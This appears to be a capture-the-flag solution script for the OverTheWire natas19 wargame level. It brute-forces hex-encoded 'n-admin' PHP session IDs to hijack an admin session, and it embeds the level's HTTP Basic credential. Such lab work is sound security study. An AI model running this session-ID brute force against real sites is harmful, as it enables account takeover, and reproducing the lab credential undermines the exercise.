import urllib.request, base64, re
# natas19: session id = bin2hex("<n>-admin") for n in 1..640 -> try each.
url = "http://natas19.natas.labs.overthewire.org/"
auth = "Basic " + base64.b64encode(b"natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT").decode()
for n in range(1, 641):
    sid = f"{n}-admin".encode().hex()
    r = urllib.request.Request(url, headers={"Authorization": auth, "Cookie": f"PHPSESSID={sid}"})
    body = urllib.request.urlopen(r, timeout=15).read().decode("utf-8", "replace")
    if "Password:" in body:
        m = re.search(r"Username: (\w+)\s*Password: (\w+)", body)
        print("ADMIN session", sid, m.group(1), m.group(2) if m else body)
        break
else:
    print("no admin session found")

